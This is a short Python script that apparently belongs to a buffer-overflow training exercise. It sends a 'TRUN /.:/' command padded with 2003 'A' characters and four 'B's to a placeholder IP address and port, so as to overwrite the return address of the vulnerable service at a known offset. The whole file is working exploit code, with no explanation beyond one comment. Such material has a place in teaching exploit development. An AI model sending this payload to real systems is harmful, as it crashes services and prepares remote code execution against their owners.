#!/usr/bin/python
import sys, socket
# Replace 2003 in shellcode with the offset number.

shellcode = "A" * 2003 + "B" * 4
payload = "TRUN /.:/" + shellcode

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('IP_ADDRESS',PORT))
	s.send((payload.encode()))
	s.close()
except:
	print("Error conecting to the server")
	sys.exit()
